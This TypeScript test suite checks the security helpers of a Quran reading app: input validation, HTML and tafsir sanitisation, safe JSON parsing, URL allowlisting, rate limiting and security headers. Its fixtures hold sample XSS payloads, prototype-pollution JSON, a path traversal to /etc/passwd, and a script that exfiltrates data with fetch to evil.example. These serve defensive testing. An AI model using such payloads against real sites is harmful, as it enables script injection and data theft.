import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  SlidingWindowRateLimiter,
  buildSecurityHeaders,
  escapeHtml,
  isTrustedApiUrl,
  isTrustedAudioUrl,
  isValidAyahNumber,
  isValidSurahNumber,
  safeJsonParse,
  sanitizeAudioUrl,
  sanitizePlainText,
  sanitizeUserInput,
  secureFetchJson,
  validateBookmarkList,
  validateReadingHistory,
  validateReadingSettings,
  validateSurahDetail,
  validateSurahTafsirDetail
} from '../security.ts';
import { renderTajwidHtml } from '../../data/tajwidRules.ts';
import { cleanTafsirText } from '../quranLogic.ts';

describe('Parameter & Range Validation', () => {
  it('validates surah numbers strictly between 1 and 114', () => {
    assert.equal(isValidSurahNumber(1), true);
    assert.equal(isValidSurahNumber(114), true);
    assert.equal(isValidSurahNumber(0), false);
    assert.equal(isValidSurahNumber(115), false);
    assert.equal(isValidSurahNumber(1.5), false);
    assert.equal(isValidSurahNumber('1'), false);
    assert.equal(isValidSurahNumber(NaN), false);
  });

  it('validates ayah numbers strictly within bounds', () => {
    assert.equal(isValidAyahNumber(1), true);
    assert.equal(isValidAyahNumber(286), true);
    assert.equal(isValidAyahNumber(287), false);
    assert.equal(isValidAyahNumber(8, 7), false);
    assert.equal(isValidAyahNumber(0), false);
  });
});

describe('XSS Sanitization & Safe HTML Rendering', () => {
  it('escapes HTML special characters while preserving Arabic script and diacritics', () => {
    const raw = 'إِنَّ ٱللَّهَ <img src=x onerror="alert(1)"> & \'test\'';
    const escaped = escapeHtml(raw);
    assert.equal(escaped.includes('<img'), false);
    assert.equal(escaped.includes('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'), true);
    assert.equal(escaped.includes('إِنَّ ٱللَّهَ'), true);
  });

  it('neutralizes XSS payloads in renderTajwidHtml while still rendering Tajwid spans', () => {
    const maliciousVerse = 'إِنَّ ٱللَّهَ <script>window.__xss=1</script><svg onload=alert(1)>';
    const rendered = renderTajwidHtml(maliciousVerse, true);

    // Must contain legitimate tajwid span for Ghunnah (إِنَّ)
    assert.equal(rendered.includes('<span class="tajwid-ghunnah">'), true);
    // Must NOT contain executable script or svg tags
    assert.equal(rendered.includes('<script>'), false);
    assert.equal(rendered.includes('<svg'), false);
    assert.equal(rendered.includes('&lt;script&gt;'), true);
    assert.equal(rendered.includes('&lt;svg onload=alert(1)&gt;'), true);
  });

  it('strips script/iframe blocks completely in cleanTafsirText without leaking script code', () => {
    const rawTafsir =
      '<p>Penjelasan ayat pertama.</p><script>fetch("https://evil.example/steal")</script><iframe src="https://evil.example"></iframe><br><br><b>Penjelasan kedua</b> &amp; hikmah.';
    const paragraphs = cleanTafsirText(rawTafsir);
    assert.equal(paragraphs.length, 2);
    assert.equal(paragraphs[0], 'Penjelasan ayat pertama.');
    assert.equal(paragraphs[1], 'Penjelasan kedua & hikmah.');
    assert.equal(paragraphs.join(' ').includes('evil.example'), false);
  });

  it('sanitizes user inputs against control bytes, dangerous protocols, and length overflow', () => {
    const dirty = '  \u0000javascript:alert(1) <script>bad()</script> Surah Yasin  ';
    const clean = sanitizeUserInput(dirty, 50);
    assert.equal(clean.includes('javascript:'), false);
    assert.equal(clean.includes('<script>'), false);
    assert.equal(clean.includes('\u0000'), false);
    assert.equal(clean.includes('Surah Yasin'), true);

    const longInput = 'a'.repeat(500);
    assert.equal(sanitizeUserInput(longInput, 100).length, 100);
  });

  it('prevents double-decoding HTML entity tag bypasses in sanitizePlainText', () => {
    const encodedTag = 'Tafsir aman &lt;img src=x onerror=alert(1)&gt; lanjutan';
    const clean = sanitizePlainText(encodedTag);
    assert.equal(clean.includes('<img'), false);
    assert.equal(clean, 'Tafsir aman  lanjutan');
  });
});

describe('Prototype-Pollution-Safe JSON Parsing', () => {
  it('strips __proto__, constructor, and prototype keys and preserves Object.prototype', () => {
    const maliciousJson =
      '{"theme":"dark","__proto__":{"polluted":true},"nested":{"constructor":{"prototype":{"hacked":1}}}}';
    const parsed = safeJsonParse<Record<string, unknown>>(maliciousJson);
    assert.notEqual(parsed, null);
    assert.equal(parsed?.theme, 'dark');
    assert.equal(({} as Record<string, unknown>).polluted, undefined);
    assert.equal(Object.prototype.hasOwnProperty.call(parsed, '__proto__'), false);
  });

  it('rejects oversized JSON payloads exceeding maxBytes', () => {
    const huge = JSON.stringify({ data: 'x'.repeat(2000) });
    assert.equal(safeJsonParse(huge, 500), null);
  });
});

describe('Network Origin & HTTPS URL Allowlisting', () => {
  it('enforces HTTPS and allowlisted hosts for API and Audio URLs', () => {
    assert.equal(isTrustedApiUrl('https://equran.id/api/v2/surat/1'), true);
    assert.equal(isTrustedApiUrl('http://equran.id/api/v2/surat/1'), false); // cleartext HTTP blocked
    assert.equal(isTrustedApiUrl('https://evil.example.com/api/v2/surat/1'), false);
    assert.equal(isTrustedApiUrl('https://user:pass@equran.id/api/v2/surat/1'), false); // credentials blocked
    assert.equal(isTrustedApiUrl('https://equran.id:8443/api/v2/surat/1'), false); // non-standard port blocked

    assert.equal(
      isTrustedAudioUrl('https://cdn.equran.id/audio-partial/Misyari-Rasyid-Al-Afasi/001001.mp3'),
      true
    );
    assert.equal(
      isTrustedAudioUrl('https://everyayah.com/data/Alafasy_128kbps/001001.mp3'),
      true
    );
    assert.equal(isTrustedAudioUrl('javascript:alert(1)'), false);
    assert.equal(isTrustedAudioUrl('http://cdn.equran.id/audio.mp3'), false);
    assert.equal(isTrustedAudioUrl('https://cdn.equran.id/../../secret.mp3'), false);
    assert.equal(isTrustedAudioUrl('https://cdn.equran.id/not-audio.html'), false);
  });

  it('falls back to verified CDN URL when sanitizeAudioUrl receives an untrusted URL', () => {
    const fallback = 'https://cdn.equran.id/audio-partial/Misyari-Rasyid-Al-Afasi/001001.mp3';
    assert.equal(sanitizeAudioUrl('http://attacker.tld/track.mp3', fallback), fallback);
    assert.equal(sanitizeAudioUrl('javascript:evil()', fallback), fallback);
  });

  it('rejects untrusted URLs in secureFetchJson immediately', async () => {
    await assert.rejects(
      () => secureFetchJson('https://attacker.example.com/steal'),
      /Blocked untrusted network URL/
    );
    await assert.rejects(
      () => secureFetchJson('http://equran.id/api/v2/surat/1'),
      /Blocked untrusted network URL/
    );
    await assert.rejects(
      () => secureFetchJson('/api/quran/../../etc/passwd'),
      /Blocked untrusted network URL/
    );
  });
});

describe('Storage & Import Schema Validation', () => {
  it('clamps out-of-range font sizes and invalid themes in validateReadingSettings', () => {
    const settings = validateReadingSettings({
      theme: 'hacker-green',
      arabicFontSize: 999,
      translationFontSize: 2,
      arabicFontFamily: 'unknown-font',
      showTajwid: 'yes'
    });
    assert.notEqual(settings, null);
    assert.equal(settings?.theme, 'light');
    assert.equal(settings?.arabicFontSize, 48);
    assert.equal(settings?.translationFontSize, 13);
    assert.equal(settings?.arabicFontFamily, 'amiri');
    assert.equal(settings?.showTajwid, true);
  });

  it('validates and sanitizes imported bookmark lists and drops invalid entries', () => {
    const rawList = [
      {
        id: 'bm_valid_1',
        type: 'ayah',
        surahNomor: 1,
        surahNamaLatin: 'Al-Fatihah',
        ayatNomor: 5,
        teksArab: 'إِيَّاكَ نَعْبُدُ',
        teksTerjemah: 'Hanya kepada Engkaulah kami menyembah',
        catatan: '<script>evil()</script>Catatan aman',
        timestamp: 1700000000000
      },
      {
        // Invalid surah number -> must be dropped
        id: 'bm_bad_surah',
        type: 'ayah',
        surahNomor: 999,
        ayatNomor: 1,
        teksArab: 'test',
        teksTerjemah: 'test'
      }
    ];

    const validated = validateBookmarkList(rawList);
    assert.notEqual(validated, null);
    assert.equal(validated?.length, 1);
    assert.equal(validated?.[0].catatan, 'Catatan aman');
  });

  it('validates reading history and Surah/Tafsir cache payloads', () => {
    const history = validateReadingHistory([
      { surahNomor: 18, surahNamaLatin: 'Al-Kahf', ayatNomor: 10, totalAyat: 110, timestamp: Date.now() },
      { surahNomor: -5, surahNamaLatin: 'Invalid', ayatNomor: 1, totalAyat: 7, timestamp: Date.now() }
    ]);
    assert.equal(history?.length, 1);
    assert.equal(history?.[0].surahNomor, 18);

    const surah = validateSurahDetail(
      {
        nomor: 112,
        nama: 'الإخلاص',
        namaLatin: 'Al-Ikhlas',
        jumlahAyat: 4,
        tempatTurun: 'Makkiyyah',
        arti: 'Ikhlas',
        deskripsi: 'Tauhid',
        audioFull: 'http://insecure.example/112.mp3',
        ayat: [
          {
            nomorAyat: 1,
            teksArab: 'قُلْ هُوَ ٱللَّهُ أَحَدٌ',
            teksLatin: 'Qul huwallahu ahad',
            teksIndonesia: 'Katakanlah Dialah Allah Yang Maha Esa',
            audio: { alafasy: 'javascript:alert(1)' }
          }
        ]
      },
      112
    );
    assert.notEqual(surah, null);
    assert.equal(
      surah?.audioFull,
      'https://cdn.equran.id/audio-full/Misyari-Rasyid-Al-Afasi/112.mp3'
    );
    assert.equal(
      surah?.ayat[0].audio?.alafasy,
      'https://cdn.equran.id/audio-partial/Misyari-Rasyid-Al-Afasi/112001.mp3'
    );

    const tafsir = validateSurahTafsirDetail(
      {
        nomor: 1,
        nama: 'الفاتحة',
        namaLatin: 'Al-Fatihah',
        jumlahAyat: 7,
        sumber: 'Kemenag RI',
        tafsir: { 1: '<script>bad()</script>Tafsir Basmalah.' }
      },
      1
    );
    assert.equal(tafsir?.tafsir[1], 'Tafsir Basmalah.');
  });
});

describe('SlidingWindowRateLimiter & HTTP Security Headers', () => {
  it('enforces request limits within window and resets after window expires', () => {
    const limiter = new SlidingWindowRateLimiter({ windowMs: 10_000, maxRequests: 3 });
    const t0 = 1_000_000;

    assert.equal(limiter.check('10.0.0.1', t0).allowed, true);
    assert.equal(limiter.check('10.0.0.1', t0 + 100).allowed, true);
    const third = limiter.check('10.0.0.1', t0 + 200);
    assert.equal(third.allowed, true);
    assert.equal(third.remaining, 0);

    // 4th request within 10s window must be blocked
    const fourth = limiter.check('10.0.0.1', t0 + 300);
    assert.equal(fourth.allowed, false);

    // Different IP is unaffected
    assert.equal(limiter.check('10.0.0.2', t0 + 300).allowed, true);

    // After window passes, 10.0.0.1 is allowed again
    assert.equal(limiter.check('10.0.0.1', t0 + 10_500).allowed, true);
  });

  it('builds iframe-safe CSP and microphone-preserving security headers', () => {
    const prodHeaders = buildSecurityHeaders(true);
    const devHeaders = buildSecurityHeaders(false);

    // Must NEVER set X-Frame-Options or restrictive frame-ancestors so AI Studio preview iframe works
    assert.equal('X-Frame-Options' in prodHeaders, false);
    assert.equal(prodHeaders['Content-Security-Policy'].includes('frame-ancestors'), false);

    // Must include essential security headers
    assert.equal(prodHeaders['X-Content-Type-Options'], 'nosniff');
    assert.equal(prodHeaders['Referrer-Policy'], 'strict-origin-when-cross-origin');
    assert.equal(prodHeaders['Strict-Transport-Security'].includes('max-age=31536000'), true);
    assert.equal(prodHeaders['Permissions-Policy'].includes('microphone=(self)'), true);
    assert.equal(prodHeaders['Permissions-Policy'].includes('camera=()'), true);

    // CSP must allow trusted audio CDNs and Google Fonts while blocking object-src
    assert.equal(prodHeaders['Content-Security-Policy'].includes("object-src 'none'"), true);
    assert.equal(prodHeaders['Content-Security-Policy'].includes('https://cdn.equran.id'), true);
    assert.equal(prodHeaders['Content-Security-Policy'].includes('https://everyayah.com'), true);
    assert.equal(prodHeaders['Content-Security-Policy'].includes('https://fonts.googleapis.com'), true);
    assert.equal(devHeaders['Content-Security-Policy'].includes('ws:'), true);
  });
});
